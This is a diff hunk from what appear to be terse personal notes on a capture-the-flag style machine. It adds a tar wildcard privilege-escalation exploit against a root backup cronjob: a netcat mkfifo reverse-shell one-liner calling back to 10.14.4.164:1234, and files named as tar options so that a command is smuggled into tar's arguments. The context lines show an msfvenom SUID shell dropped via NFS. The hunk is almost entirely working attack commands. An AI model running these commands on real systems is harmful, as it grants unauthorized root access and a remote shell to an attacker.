@@ -43,3 +43,12 @@ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 chmod +xs /tmp/nfs/shell.elf
 /tmp/shell.elf
 
+# tar exploit 
+cat /home/milesdyson/backups/backup.sh # es un cronjob
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+---
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.4.164 1234 >/tmp/f" > shell.sh
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
